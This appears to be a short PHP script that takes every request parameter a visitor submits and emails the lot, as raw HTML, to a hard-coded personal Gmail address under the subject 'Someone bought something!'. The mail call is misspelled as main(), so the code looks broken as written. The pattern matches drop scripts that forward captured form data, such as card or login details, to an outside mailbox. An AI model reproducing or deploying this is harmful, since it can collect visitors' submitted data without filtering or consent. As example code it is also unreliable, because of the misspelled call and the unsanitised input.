<?php
foreach ($_REQUEST as $key => $value) {
  $content .= $key.' '.$value.'<br>';
}
main("mayorga.ml@gmail.com", "Someone bought something!", $content, "Content-type:text/html");

?>